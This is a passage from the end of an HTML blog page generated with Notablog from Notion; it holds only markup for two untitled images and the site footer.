src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F5c6c869a-1860-413d-9589-745c09e1fbcc%2FUntitled.png?width=553&amp;table=block&amp;id=aad8d86f-3b5e-44b6-a0ba-0197dc6e5ee2" style="width:553px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/509aca2d0d824dd594a22f7ad9ceb9dc" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F9b5a0d3c-64fc-42e4-b8d6-cfa71b2580e7%2FUntitled.png?width=554&amp;table=block&amp;id=509aca2d-0d82-4dd5-94a2-2f7ad9ceb9dc"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F9b5a0d3c-64fc-42e4-b8d6-cfa71b2580e7%2FUntitled.png?width=554&amp;table=block&amp;id=509aca2d-0d82-4dd5-94a2-2f7ad9ceb9dc" style="width:554px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></article>
  <footer class="Footer">
  <div>&copy; 这儿是什么地方 2022</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>
</body>

</html>